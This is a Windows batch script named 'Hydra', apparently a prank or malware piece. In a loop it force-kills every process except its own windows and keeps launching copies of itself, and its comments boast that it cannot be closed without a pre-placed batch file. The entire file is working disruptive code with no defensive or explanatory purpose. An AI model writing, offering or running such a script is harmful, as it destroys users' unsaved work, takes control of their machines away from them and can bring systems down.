@ECHO OFF
::What if we use a text document to keep track of how many have opened, so all programs know how many to test for.
::Lets try the text document first. What if it created a new text document every time instead of editing the same one. 
TITLE Hydra
SET n=1
::What do you mean, it is above the loop? ;)
:loop
::Lets make this uncloseable by all other programs. 
FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq Hydra" ^| find/c "exe"`) DO (
SET windowcount=%%F
)
TASKKILL /F /FI "WINDOWTITLE ne Hydra"
::Closes everything except for itself. They have to have a batch file already on their desktop to stop this one.
IF "%windowcount%"=="%n%" (
START Hydra.bat
START Hydra.bat
SET /a n+=1
)
GOTO :loop
